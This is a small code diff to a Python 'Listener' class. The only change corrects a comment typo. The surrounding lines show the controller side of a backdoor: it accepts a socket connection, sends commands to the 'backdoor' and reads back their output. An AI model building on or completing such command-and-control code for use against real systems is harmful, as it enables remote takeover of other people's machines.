@@ -12,7 +12,7 @@ class Listener:
         self.connection, address = listener.accept()  # accept() -> (socket object, address info)
         print("[+] Got a connection from " + str(address))
 
-    # Send command remotely and receives it output
+    # Send command remotely and receives its output
     def execute_remotely(self, command):
         self.connection.send(command)  # Sending command to backdoor
         return self.connection.recv(1024)  # Receiving output from backdoor
